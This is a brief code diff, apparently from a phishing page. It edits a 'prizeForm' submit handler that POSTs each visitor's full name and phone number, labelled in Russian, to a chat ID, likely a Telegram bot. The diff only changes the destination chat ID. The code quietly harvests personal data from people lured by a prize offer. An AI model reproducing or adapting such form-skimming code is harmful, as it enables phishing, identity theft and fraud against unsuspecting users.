@@ -14,7 +14,7 @@ document.getElementById('prizeForm').addEventListener('submit', function(e) {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({
-      chat_id: '7841988718',
+      chat_id: '-1002803266367',
       text: `👤 ФИО: ${name}\n📱 Номер: ${phone}`
     })
   })
